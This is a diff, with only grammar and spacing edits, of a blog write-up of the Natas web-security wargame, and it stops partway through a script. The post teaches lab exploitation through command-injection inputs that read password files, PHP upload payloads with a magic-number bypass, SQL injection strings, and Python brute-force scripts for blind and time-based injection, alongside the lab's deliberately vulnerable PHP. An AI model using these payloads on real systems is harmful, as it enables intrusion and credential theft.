@@ -1,12 +1,12 @@
 Title: Exploiting the Web in 20 Lessons (Natas)
 Date: 2014-10-16 6:01
 Category: Web Security
-Tags: Wargames, Python, BurpSuite, request, PHP, JavaScript, SQLi, Command_Injection, MySQL,  XOR, Brute_Force
+Tags: Wargames, Python, BurpSuite, request, PHP, JavaScript, SQLi, Command_Injection, MySQL, XOR, Brute_Force
 
 
 ![cyber](http://i.imgur.com/ihtJsdE.png)
 
-Continuing my quest through the [Wargames], today I am going to talk about the 20 first levels of [Natas], the **web exploitation episode**.
+Continuing my quest through the [Wargames], today, I am going to talk about the 20 first levels of [Natas], the **web exploitation episode**.
 
 I divide the exploits into two parts. The first part contains the easy challenges that don't demand much art (and are a bit boring). The second part comprehends the challenges that do, with scripting, brute force, and all the fun stuff.
 
@@ -25,12 +25,12 @@ Let the game begin.
 
 The first two levels start with a simple HTML page. No hints.
 
-Obviously, the first thing we do is ti take a look  at the source code.
+The first thing we do is to take a look at the source code.
 
 In the 0th level, the password is straight from the there.
 
 
-In the first level, we need to  disable  **JavaScript** so you can right click it:
+In the first level, we need to disable **JavaScript** so you can right click it:
 
 ```html
 <body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
@@ -63,13 +63,13 @@ gives a file ```users.txt``` with the password.
 
 ### Level 3: Robots.txt
 
-Looking at the source code we see this comment:
+Looking at the source code, we see this comment:
 
 ```
 <!-- No more information leaks!! Not even Google will find it this time... -->
 ```
 
-In general, websites use a file called **[robots.txt]**  to tell search engines what should be indexed.
+In general, websites use a file called **[robots.txt]** to tell search engines what should be indexed.
 
 Looking at:
 
@@ -85,14 +85,14 @@ User-agent: *
 Disallow: /s3cr3t/
 ```
 
-Looking at the content of  the folder */s3cr3t/* revels:
+Looking at the content of the folder */s3cr3t/* revels:
 
 ```
 Index of /s3cr3t
 
-[ICO]    Name    Last modified    Size    Description
-[DIR]    Parent Directory         -
-[TXT]    users.txt    12-Jul-2013 13:35    40
+[ICO] Name Last modified Size Description
+[DIR] Parent Directory -
+[TXT] users.txt 12-Jul-2013 13:35 40
 ```
 
 Which give us the password file:
@@ -117,7 +117,7 @@ The server thinks we are coming from a page that is indicated in the **[referer]
 The referer is a (historically misspelled) tag that carries the address of the URL that linked to the address we are requesting.
 
 
-There are many ways to tamper this. While we could use browser plugins such as [tampermonkey] or [modify-headers], the good old **curl** do it easily:
+There are many ways to tamper this. While we could use browser plugins such as [tampermonkey] or [modify-headers], the good old **curl** do it quickly:
 
 [referer]: http://en.wikipedia.org/wiki/HTTP_referer
 
@@ -144,7 +144,7 @@ Inspecting the source does not give any additional information.
 
 We check the elements of the page. There is a cookie named *loggedin* with value **0**. What happens if we change it to **1**?
 
-Using the [edit this cookie] plugin we are able to edit it and get the next password.
+Using the [edit this cookie] plugin, we are able to edit it and get the next password.
 
 
 [edit this cookie]: http://www.editthiscookie.com/start/
@@ -159,13 +159,13 @@ This level comes with a PHP form. We take a look at the source code:
 <?
 include "includes/secret.inc";
 
-    if(array_key_exists("submit", $_POST)) {
-        if($secret == $_POST['secret']) {
-        print "Access granted. The password for natas7 is <censored>";
-    } else {
-        print "Wrong secret";
-    }
-    }
+ if(array_key_exists("submit", $_POST)) {
+ if($secret == $_POST['secret']) {
+ print "Access granted. The password for natas7 is <censored>";
+ } else {
+ print "Wrong secret";
+ }
+ }
 ?>
 <form method=post>
 Input secret: <input name=secret><br>
@@ -175,7 +175,7 @@ Input secret: <input name=secret><br>
 
 Double LOL.
 
-We  just need to inspect that first URL to get the value of *$secret*:
+We just need to inspect that first URL to get the value of *$secret*:
 
 > http://natas6.natas.labs.overthewire.org/includes/secret.inc
 
@@ -217,19 +217,19 @@ This level comes with a PHP form, similar to the 6th level. We take a look at th
 <?
 $encodedSecret = "3d3d516343746d4d6d6c315669563362";
 function encodeSecret($secret) {
-    return bin2hex(strrev(base64_encode($secret)));
+ return bin2hex(strrev(base64_encode($secret)));
 }
 if(array_key_exists("submit", $_POST)) {
-    if(encodeSecret($_POST['secret']) == $encodedSecret) {
-    print "Access granted. The password for natas9 is <censored>";
-    } else {
-    print "Wrong secret";
-    }
+ if(encodeSecret($_POST['secret']) == $encodedSecret) {
+ print "Access granted. The password for natas9 is <censored>";
+ } else {
+ print "Wrong secret";
+ }
 }
 ?>
 ```
 
-Simple. The secret is  encoded in some obscuration. Funny enough, it uses the PHP function [strrev] to reverse the string.
+Simple. The secret is encoded in some obscuration. Funny enough, it uses the PHP function [strrev] to reverse the string.
 
 We perform the following operations to recover the variable *$secret* from the variable *$encodedSecret*:
 
@@ -255,7 +255,7 @@ III - Base64 decode (*base64_encode*):
 'oubWYf2kBq'
 ```
 
-We submit this last string in the input form,  giving us the password.
+We submit this last string in the input-form, giving us the password.
 
 
 [strrev]: http://php.net/manual/en/function.strrev.php
@@ -290,24 +290,24 @@ Output:
 <?
 $key = "";
 if(array_key_exists("needle", $_REQUEST)) {
-    $key = $_REQUEST["needle"];
+ $key = $_REQUEST["needle"];
 }
 if($key != "") {
-    passthru("grep -i $key dictionary.txt");
+ passthru("grep -i $key dictionary.txt");
 }
 ?>
 </pre>
 ```
 
-If we try inputs such as \*, "", or \n, the query  shows the entire list of words inside the file *dictionary.txt*. We tried that, but no password there.
+If we try inputs such as \*, "", or \n, the query shows the entire list of words inside the file *dictionary.txt*. We tried that, but no password there.
 
-Taking a closer look to the code we notice the PHP function [passthru](), which is used to execute an external command.
+Taking a closer look to the code, we notice the PHP function [passthru](), which is used to execute an external command.
 
-Since the variable **$key** is **not sanitized**,  we can add a crafted input to it to inject a code that  displays the password at the folder */etc/natas_webpass/natas10*. This type of attack is called [OS command injection].
+Since the variable **$key** is **not sanitized**, we can add a crafted input to it to inject a code that displays the password at the folder */etc/natas_webpass/natas10*. This type of attack is called [OS command injection].
 
 What should we add to the original *grep* command?
 
-In **Bash**, the *semicolon* permits putting more than one command on the same line. Adding a **;** to the input allows us to  add a **cat** after that.
+In **Bash**, the *semicolon* permits putting more than one command on the same line. Adding a **;** to the input allows us to add a **cat** after that.
 
 The crafted input is:
 ```
@@ -326,7 +326,7 @@ This gives us the password.
 
 ### Level 10: OS Command Injection II
 
-This level starts with the same search form from the previous level. However, this time we get the warning:
+This level starts with the same search form from the previous level. However, this time, we get the warning:
 
 > For security reasons, we now filter on certain characters.
 
@@ -337,30 +337,30 @@ We take a look at the source code:
 <?
 $key = "";
 if(array_key_exists("needle", $_REQUEST)) {
-    $key = $_REQUEST["needle"];
+ $key = $_REQUEST["needle"];
 }
 if($key != "") {
-    if(preg_match('/[;|&]/',$key)) {
-        print "Input contains an illegal character!";
-    } else {
-        passthru("grep -i $key dictionary.txt");
-    }
+ if(preg_match('/[;|&]/',$key)) {
+ print "Input contains an illegal character!";
+ } else {
+ passthru("grep -i $key dictionary.txt");
+ }
 }
 ?>
 </pre>
 ```
 
-The difference here is an *if* clause with the function [preg_match]. This function is used to search for a pattern in a string, *i.e.*, it clears the string against the pattern **;**, **|**,  and **&**.
+The difference here is an *if* clause with the function [preg_match]. This function is used to search for a pattern in a string, *i.e.*, it clears the string against the pattern **;**, **|**, and **&**.
 
 We cannot use the same attack as before with a semicolon!
 
 
 We need to some other injection that does not need those symbols.
 
-When I was messing around in the previous level I noticed that we can use **""** as an input.  Awesome. The following input reveals the password:
+When I was messing around in the previous level, I noticed that we could use **""** as an input. Awesome. The following input reveals the password:
 
 ```
-""  cat /etc/natas_webpass/natas11
+"" cat /etc/natas_webpass/natas11
 ```
 
 
@@ -372,7 +372,7 @@ When I was messing around in the previous level I noticed that we can use **""**
 
 ### Level 11: Cookies and XOR Encryption
 
-This level starts with an input form to set a background color and a message:
+This level starts with an input form to set background color and a message:
 
 > cookies are protected with XOR encryption
 
@@ -395,7 +395,7 @@ What happens if we manage to set *showpassword* to *yes*? This is answered in th
 
 ```
 if($data["showpassword"] == "yes") {
-    print "The password for natas12 is <censored><br>";
+ print "The password for natas12 is <censored><br>";
 }
 ```
 We know our way now.
@@ -405,15 +405,15 @@ We then have this XOR function that takes an input value, *$text*, and XOR to a 
 
 ```
 function xor_encrypt($in) {
-    $key = '<censored>';
-    $text = $in;
-    $outText = '';
+ $key = '<censored>';
+ $text = $in;
+ $outText = '';
 
-    // Iterate through each character
-    for($i=0;$i<strlen($text);$i++) {
-    $outText .= $text[$i] ^ $key[$i % strlen($key)];
-    }
-    return $outText;
+ // Iterate through each character
+ for($i=0;$i<strlen($text);$i++) {
+ $outText .= $text[$i] ^ $key[$i % strlen($key)];
+ }
+ return $outText;
 }
 ```
 
@@ -421,27 +421,27 @@ The rest of the code is only important to show that the string encoded in *base6
 
 ```
 function loadData($def) {
-    global $_COOKIE;
-    $mydata = $def;
-    if(array_key_exists("data", $_COOKIE)) {
-    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
-    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
-        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
-        $mydata['showpassword'] = $tempdata['showpassword'];
-        $mydata['bgcolor'] = $tempdata['bgcolor'];
-        }
-    }
-    }
-    return $mydata;
+ global $_COOKIE;
+ $mydata = $def;
+ if(array_key_exists("data", $_COOKIE)) {
+ $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
+ if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
+ if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
+ $mydata['showpassword'] = $tempdata['showpassword'];
+ $mydata['bgcolor'] = $tempdata['bgcolor'];
+ }
+ }
+ }
+ return $mydata;
 }
 function saveData($d) {
-    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+ setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
 }
 $data = loadData($defaultdata);
 if(array_key_exists("bgcolor",$_REQUEST)) {
-    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
-        $data['bgcolor'] = $_REQUEST['bgcolor'];
-    }
+ if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
+ $data['bgcolor'] = $_REQUEST['bgcolor'];
+ }
 }
 saveData($data);
 <form>
@@ -464,14 +464,14 @@ Now, we write the following script in PHP, modifying the XOR function to take ou
 <?php
 $cookie = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw');
 function xor_encrypt($in){
-    $text = $in;
-    $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
-    $outText = '';
+ $text = $in;
+ $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
+ $outText = '';
 
-    for($i=0;$i<strlen($text);$i++) {
-        $outText .= $text[$i] ^ $key[$i % strlen($key)];
-    }
-    return $outText;
+ for($i=0;$i<strlen($text);$i++) {
+ $outText .= $text[$i] ^ $key[$i % strlen($key)];
+ }
+ return $outText;
 }
 print xor_encrypt($cookie);
 ?>
@@ -492,14 +492,14 @@ For that, we created the following script:
 ```
 <?php
 function xor_encrypt_mod(){
-    $text = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
-    $key = 'qw8J';
-    $outText = '';
+ $text = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
+ $key = 'qw8J';
+ $outText = '';
 
-    for($i=0;$i<strlen($text);$i++) {
-        $outText .= $text[$i] ^ $key[$i % strlen($key)];
-    }
-    return $outText;
+ for($i=0;$i<strlen($text);$i++) {
+ $outText .= $text[$i] ^ $key[$i % strlen($key)];
+ }
+ return $outText;
 }
 print base64_encode(xor_encrypt_mod());
 ?>
@@ -521,13 +521,13 @@ Inspecting the source code, we see that the first function returns a random stri
 
 ```
 function genRandomString() {
-    $length = 10;
-    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
-    $string = "";
-    for ($p = 0; $p < $length; $p++) {
-        $string .= $characters[mt_rand(0, strlen($characters)-1)];
-    }
-    return $string;
+ $length = 10;
+ $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+ $string = "";
+ for ($p = 0; $p < $length; $p++) {
+ $string .= $characters[mt_rand(0, strlen($characters)-1)];
+ }
+ return $string;
 }
 ```
 
@@ -535,14 +535,14 @@ This string is used as the name of the uploaded file in the server:
 
 ```
 function makeRandomPath($dir, $ext) {
-    do {
-    $path = $dir."/".genRandomString().".".$ext;
-    } while(file_exists($path));
-    return $path;
+ do {
+ $path = $dir."/".genRandomString().".".$ext;
+ } while(file_exists($path));
+ return $path;
 }
 function makeRandomPathFromFilename($dir, $fn) {
-    $ext = pathinfo($fn, PATHINFO_EXTENSION);
-    return makeRandomPath($dir, $ext);
+ $ext = pathinfo($fn, PATHINFO_EXTENSION);
+ return makeRandomPath($dir, $ext);
 }
 ```
 
@@ -564,16 +564,16 @@ Finally, the last function performs the file uploading. Notice that the code doe
 
 ```
 if(array_key_exists("filename", $_POST)) {
-    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
-        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
-        echo "File is too big";
-    } else {
-        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
-            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
-        } else{
-            echo "There was an error uploading the file, please try again!";
-        }
-    }
+ $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+ if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+ echo "File is too big";
+ } else {
+ if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+ echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+ } else{
+ echo "There was an error uploading the file, please try again!";
+ }
+ }
 } else {
 ?>
 ```
@@ -582,9 +582,9 @@ if(array_key_exists("filename", $_POST)) {
 
 We still can upload whatever file we want.
 
-Since the file extension is changed to *jpg* in the browser side, we have control of this,  we can easly tamper the POST data.
+Since the file extension is changed to *jpg* in the browser side, we have control of this; we can easily tamper the POST data.
 
-Fist, let's think about the exploit we want to send to the server. Since we know that the server runs PHP, we have several possibilities in this language!
+First, let's think about the exploit we want to send to the server. Since we know that the server runs PHP, we have several possibilities in this language!
 
 How about the following script which uses the function [readfile()]?
 
@@ -594,7 +594,7 @@ readfile('/etc/natas_webpass/natas13');
 ?>
 ```
 
-[readfile()]:  http://php.net/manual/en/function.readfile.php
+[readfile()]: http://php.net/manual/en/function.readfile.php
 
 We could also use a [system] command:
 
@@ -621,7 +621,7 @@ Any of these exploits will work.
 
 Now, let's work our way around the fact that the browser will attempt to change our script extension from *php* to *jpg*.
 
-There are several ways to fix this. An easy way is to use a proxy or  extension, such as [Burp Suite] or [FireBug] to change the filename before it is sent to the server.
+There are several ways to fix this. An easy way is to use a proxy or extension, such as [Burp Suite] or [FireBug] to change the filename before it is sent to the server.
 
 We use *Burp* and the attack is stated in the following steps:
 
@@ -639,7 +639,7 @@ We use *Burp* and the attack is stated in the following steps:
 [Burp Suite]: http://portswigger.net/burp/
 [FireBug]: http://getfirebug.com/
 
-If this is your first time with Burp, [this is how you run it]. Burp works as an HTTP proxy server, where all  HTTP/S traffic from your browser passes through it. I will show in details how to do this in a *nix system.
+If this is your first time with Burp, [this is how you run it]. Burp works as an HTTP proxy server, where all HTTP/S traffic from your browser passes through it. I will show in details how to do this in a *nix system.
 
 
 [this is how you run it]: http://portswigger.net/burp/help/suite_gettingstarted.html
@@ -650,7 +650,7 @@ First, we lauch Burp:
 $ java -jar -Xmx1024m /path/to/burp.jar
 ```
 
-Then we go to the proxy tab and then options and we confirm Burp's Proxy listener is active at *127.0.0.1:8080*:
+Then we go to the proxy tab and then options, and we confirm Burp's Proxy listener is active at *127.0.0.1:8080*:
 
 ![cyber](http://i.imgur.com/5xkHB29.png)
 
@@ -688,23 +688,23 @@ We take a look at the source code and the only difference from the previous leve
 ```php
 <?
 if(array_key_exists("filename", $_POST)) {
-    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
-        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
-        echo "File is too big";
-    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
-        echo "File is not an image";
-    } else {
-        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
-            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
-        } else{
-            echo "There was an error uploading the file, please try again!";
-        }
-    }
+ $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+ if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+ echo "File is too big";
+ } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+ echo "File is not an image";
+ } else {
+ if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+ echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+ } else{
+ echo "There was an error uploading the file, please try again!";
+ }
+ }
 } else {
 ?>
 ```
 
-The clause uses the PHP function  [exif_imagetype] to check whether the file is  an image type.
+The clause uses the PHP function [exif_imagetype] to check whether the file is an image type.
 
 The way it works is by checking the first bytes of the image and seeing whether it has an image signature. This signature is known as the [magic number]. Every binary has one.
 
@@ -712,7 +712,7 @@ It should be obvious that adding the right signature to a file could tamper it t
 
 #### Crafting the attack:
 
-We search for an [image magic number]. For *jpg*, it's the hexadeximal *ff d8 ff e0*. For *gif*, however, it's really simple: *GIF89a*.
+We search for an [image magic number]. For *jpg*, it's the hexadecimal *ff d8 ff e0*. For *gif*, however, it's really simple: *GIF89a*.
 
 Let's use it!
 
@@ -742,30 +742,30 @@ This level starts with a *username* and *password* form:
 
 ![cyber](http://i.imgur.com/qDA3nCP.png)
 
-Looking at the source code, we see THE connection to  a MySQL server, and a SQL query to look for a record in the database:
+Looking at the source code, we see THE connection to a MySQL server, and a SQL query to look for a record in the database:
 
 ```php
 <?
 if(array_key_exists("username", $_REQUEST)) {
-    $link = mysql_connect('localhost', 'natas14', '<censored>');
-    mysql_select_db('natas14', $link);
+ $link = mysql_connect('localhost', 'natas14', '<censored>');
+ mysql_select_db('natas14', $link);
 
-    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
-    if(array_key_exists("debug", $_GET)) {
-        echo "Executing query: $query<br>";
-    }
+ $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+ if(array_key_exists("debug", $_GET)) {
+ echo "Executing query: $query<br>";
+ }
 
-    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
-            echo "Successful login! The password for natas15 is <censored><br>";
-    } else {
-            echo "Access denied!<br>";
-    }
-    mysql_close($link);
+ if(mysql_num_rows(mysql_query($query, $link)) > 0) {
+ echo "Successful login! The password for natas15 is <censored><br>";
+ } else {
+ echo "Access denied!<br>";
+ }
+ mysql_close($link);
 } else {
 ?>
 ```
 
-If the query returns one or more row, we get a message  with the password for the next level.
+If the query returns one or more row, we get a message with the password for the next level.
 
 The *GET* in the *if* clause declares the parameter *debug* without checking whether this is a safe query input!
 
@@ -789,7 +789,7 @@ SELECT * from users where username="$(Username)" and password="$(Password)"
 
 We want to inject stuff in the middle to make this query do *more things*.
 
-In SQLi, we need to take care of the **"** that is automatically added in the end by the server. The simplest way to do this is by including an **always true clause** at the end of everything. This can be represented by:
+In SQLi, we need to take care of the **"** that is automatically added in the end by the server. The simplest way to do this is by including an **always true clause** at the end of everything. It can be represented by:
 
 ```
 OR '1'='1'
@@ -801,7 +801,7 @@ So, for example, the following query would not give any error:
 SELECT * from users where username="admin" and password="pass" OR "1"="1"
 ```
 
-Now, we just need to add stuff before OR!
+Now, we need to add stuff before OR!
 
 When we craft the right URL, we keep in mind that whitespace will be translated to *%20* and **""** will be translated to *%22*.
 
@@ -827,7 +827,7 @@ reveals the password.
 
 
 
-This level starts with a  form to check the existence of some username:
+This level starts with a form to check the existence of some username:
 
 ![cyber](http://i.imgur.com/SO4K5wK.png)
 
@@ -836,33 +836,33 @@ This level starts with a  form to check the existence of some username:
 ```
 /*
 CREATE TABLE `users` (
-  `username` varchar(64) DEFAULT NULL,
-  `password` varchar(64) DEFAULT NULL
+ `username` varchar(64) DEFAULT NULL,
+ `password` varchar(64) DEFAULT NULL
 );
 */
 ```
 
-And the fact that the *$query*  does not have a password part and it is hygienized now:
+And the fact that the *$query* does not have a password part and it is hygienized now:
 
 ```
 if(array_key_exists("username", $_REQUEST)) {
-    $link = mysql_connect('localhost', 'natas15', '<censored>');
-    mysql_select_db('natas15', $link);
-    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
-    if(array_key_exists("debug", $_GET)) {
-        echo "Executing query: $query<br>";
-    }
-    $res = mysql_query($query, $link);
-    if($res) {
-    if(mysql_num_rows($res) > 0) {
-        echo "This user exists.<br>";
-    } else {
-        echo "This user doesn't exist.<br>";
-    }
-    } else {
-        echo "Error in query.<br>";
-    }
-    mysql_close($link);
+ $link = mysql_connect('localhost', 'natas15', '<censored>');
+ mysql_select_db('natas15', $link);
+ $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+ if(array_key_exists("debug", $_GET)) {
+ echo "Executing query: $query<br>";
+ }
+ $res = mysql_query($query, $link);
+ if($res) {
+ if(mysql_num_rows($res) > 0) {
+ echo "This user exists.<br>";
+ } else {
+ echo "This user doesn't exist.<br>";
+ }
+ } else {
+ echo "Error in query.<br>";
+ }
+ mysql_close($link);
 } else {
 ?>
 ```
@@ -879,7 +879,7 @@ If we check the existence of the users *nata15* or *natas17*, we get:
 
 However, if we check for *natas16* we verify that this user exists! Now we just need a password.
 
-Since checking this *natas16*  will always return true, we can  inject another clause to the query using the keyword AND:
+Since checking this *natas16* will always return true, we can inject another clause to the query using the keyword AND:
 
 
 ```
@@ -899,7 +899,7 @@ We can use the SQL function [SUBSTRING] and the symbol **%** to compare strings.
 AND SUBSTRING(password,3,1) = BINARY "a"
 ```
 
-If SUBSTRING returns false, the entire query becomes false because of the **AND** and we see the message:
+If SUBSTRING returns false, the entire query becomes false because of the **AND**, and we see the message:
 
 > This user doesn’t exist.
 
@@ -920,31 +920,31 @@ import requests
 import string
 
 def brute_force_password(LENGTH, AUTH, CHARS, SQL_URL1, SQL_URL2, KEYWORD):
-        password = ''
-        for i in range(1, LENGTH+1):
-            for j in range (len(CHARS)):
-                r = requests.get( ( SQL_URL1 + str(i) + SQL_URL2 + CHARS[j] ), auth=AUTH)
-                print r.url
-                if KEYWORD in r.text:
-                        password += CHARS[j]
-                        print("Password so far: " + password)
-                        break
-        return password
+ password = ''
+ for i in range(1, LENGTH+1):
+ for j in range (len(CHARS)):
+ r = requests.get( ( SQL_URL1 + str(i) + SQL_URL2 + CHARS[j] ), auth=AUTH)
+ print r.url
+ if KEYWORD in r.text:
+ password += CHARS[j]
+ print("Password so far: " + password)
+ break
+ return password
 
 if __name__ == '__main__':
-        # authorization: login and password
-        AUTH = ('natas15', '*******************************')
+ # authorization: login and password
+ AUTH = ('natas15', '*******************************')
 
-        # BASE64 password and 32 bytes
-        CHARS = string.ascii_letters + string.digits
-        LENGTH = 32
+ # BASE64 password and 32 bytes
+ CHARS = string.ascii_letters + string.digits
+ LENGTH = 32
 
-        # crafted url option 1
-        SQL_URL1 = 'http://natas15.natas.labs.overthewire.org?username=natas16" AND SUBSTRING(password,'
-        SQL_URL2 = ',1) LIKE BINARY "'
-        KEYWORD = 'exists'
+ # crafted url option 1
+ SQL_URL1 = 'http://natas15.natas.labs.overthewire.org?username=natas16" AND SUBSTRING(password,'
+ SQL_URL2 = ',1) LIKE BINARY "'
+ KEYWORD = 'exists'
 
-        print(brute_force_password(LENGTH, AUTH, CHARS, SQL_URL1, SQL_URL2, KEYWORD))
+ print(brute_force_password(LENGTH, AUTH, CHARS, SQL_URL1, SQL_URL2, KEYWORD))
 ```
 
 After around 10 minutes we have our password.
@@ -963,14 +963,14 @@ The source code is similar to the 9th and 10th levels:
 <?
 $key = "";
 if(array_key_exists("needle", $_REQUEST)) {
-    $key = $_REQUEST["needle"];
+ $key = $_REQUEST["needle"];
 }
 if($key != "") {
-    if(preg_match('/[;|&`\'"]/',$key)) {
-        print "Input contains an illegal character!";
-    } else {
-        passthru("grep -i \"$key\" dictionary.txt");
-    }
+ if(preg_match('/[;|&`\'"]/',$key)) {
+ print "Input contains an illegal character!";
+ } else {
+ passthru("grep -i \"$key\" dictionary.txt");
+ }
 }
 ?>
 </pre>
@@ -981,7 +981,7 @@ The difference now is that the code is being hygienized for **`**, **"**, and **
 We need to figure out what else we can use.
 
 
-Bash has a feature called [command substitution], where  commands can be passed with:
+Bash has a feature called [command substitution], where commands can be passed with:
 ```
 $(command)
 ```
@@ -998,7 +998,7 @@ Wed Oct 14 20:23:41 EDT 2014
 
 #### Stating the attack:
 
-We are going to use command substitution to craft a command in the variable *$key*, which lies inside:
+We are going to use command substitution to craft command in the variable *$key*, which lies inside:
 
 ```
 grep -i \"$key\" dictionary.txt
@@ -1019,7 +1019,7 @@ If *grep II* finds a match, it returns the char. In the other case, it won't ret
 
 Once *grep II* is over, *grep I* will do the regular search for the pattern we passed (banana).
 
-If *grep II* didn't return anything, banana will be banana. If *grep II* returns a match, banana will have this extra string added to it (abanana).
+If *grep II* didn't return anything, a banana will be banana. If *grep II* returns a match, a banana will have this extra string added to it (abanana).
 
 Now we can extend this logic to each char in the password string.
 
@@ -1029,7 +1029,7 @@ By inspection, we see that the crafted URL to check, say, *a* in the first char,
 
 > http://natas16.natas.labs.overthewire.org/?needle=$(grep%20-E%20^a.*%20/etc/natas_webpass/natas17)banana&submit=Search
 
-This allows us to write the following script:
+So we can write the following script:
 
 
 ```python
@@ -1037,35 +1037,35 @@ import requests
 import string
 
 def brute_force_password(LENGTH, AUTH, CHARS, URL1, URL2):
-        password = ''
-        for i in range(1, LENGTH+1):
-            for j in range (len(CHARS)):
-                print("Position %d: Trying %s ..." %(i, CHARS[j]))
-                r = requests.get( ( URL1 + password + CHARS[j] + URL2  ), auth=AUTH)
-                if 'bananas' not in r.text:
-                        password += CHARS[j]
-                        print("Password so far: " + password)
-                        break
-        return password
+ password = ''
+ for i in range(1, LENGTH+1):
+ for j in range (len(CHARS)):
+ print("Position %d: Trying %s ..." %(i, CHARS[j]))
+ r = requests.get( ( URL1 + password + CHARS[j] + URL2 ), auth=AUTH)
+ if 'bananas' not in r.text:
+ password += CHARS[j]
+ print("Password so far: " + password)
+ break
+ return password
 
 if __name__ == '__main__':
-        # authorization: login and password
-        AUTH = ('natas16', '****************************')
+ # authorization: login and password
+ AUTH = ('natas16', '****************************')
 
-        # BASE64 password and 32 bytes
-        CHARS = string.ascii_letters + string.digits
-        LENGTH = 32
+ # BASE64 password and 32 bytes
+ CHARS = string.ascii_letters + string.digits
+ LENGTH = 32
 
-        # crafted url
-        URL1 = 'http://natas16.natas.labs.overthewire.org?needle=$(grep -E ^'
-        URL2 = '.* /etc/natas_webpass/natas17)banana&submit=Search'
+ # crafted url
+ URL1 = 'http://natas16.natas.labs.overthewire.org?needle=$(grep -E ^'
+ URL2 = '.* /etc/natas_webpass/natas17)banana&submit=Search'
 
-        print(brute_force_password(LENGTH, AUTH, CHARS, URL1, URL2))
+ print(brute_force_password(LENGTH, AUTH, CHARS, URL1, URL2))
 ```
 
 
 
-Around 10 minutes later we get our password.
+Around 10 minutes later, we get our password.
 
 
 
@@ -1079,28 +1079,28 @@ This level starts with a username search similar from the 14th and 15th levels:
 ```
 /*
 CREATE TABLE `users` (
-  `username` varchar(64) DEFAULT NULL,
-  `password` varchar(64) DEFAULT NULL
+ `username` varchar(64) DEFAULT NULL,
+ `password` varchar(64) DEFAULT NULL
 );
 */
 if(array_key_exists("username", $_REQUEST)) {
-    $link = mysql_connect('localhost', 'natas17', '<censored>');
-    mysql_select_db('natas17', $link);
-    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
-    if(array_key_exists("debug", $_GET)) {
-        echo "Executing query: $query<br>";
-    }
-    $res = mysql_query($query, $link);
-    if($res) {
-    if(mysql_num_rows($res) > 0) {
-        //echo "This user exists.<br>";
-    } else {
-        //echo "This user doesn't exist.<br>";
-    }
-    } else {
-        //echo "Error in query.<br>";
-    }
-    mysql_close($link);
+ $link = mysql_connect('localhost', 'natas17', '<censored>');
+ mysql_select_db('natas17', $link);
+ $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+ if(array_key_exists("debug", $_GET)) {
+ echo "Executing query: $query<br>";
+ }
+ $res = mysql_query($query, $link);
+ if($res) {
+ if(mysql_num_rows($res) > 0) {
+ //echo "This user exists.<br>";
+ } else {
+ //echo "This user doesn't exist.<br>";
+ }
+ } else {
+ //echo "Error in query.<br>";
+ }
+ mysql_close($link);
 } else {
 ?>
 ```
@@ -1138,36 +1138,36 @@ import requests
 import string
 
 def brute_force_password(LENGTH, AUTH, CHARS, SQL_URL1, SQL_URL2):
-        password = ''
-        for i in range(1, LENGTH+1):
-            for j in range (len(CHARS)):
-                r = requests.get( ( SQL_URL1 + str(i) + SQL_URL2 + CHARS[j] + SQL_URL3 ), auth=AUTH)
-                time =  r.elapsed.total_seconds()
-                print("Position %d: trying %s... Time: %.3f" %(i, CHARS[j], time))
-                #print r.url
-                if time >= 9:
-                    password += CHARS[j]
-                    print("Password so far: " + password)
-                    break
-        return password
+ password = ''
+ for i in range(1, LENGTH+1):
+ for j in range (len(CHARS)):
+ r = requests.get( ( SQL_URL1 + str(i) + SQL_URL2 + CHARS[j] + SQL_URL3 ), auth=AUTH)
+ time = r.elapsed.total_seconds()
+ print("Position %d: trying %s... Time: %.3f" %(i, CHARS[j], time))
+ #print r.url
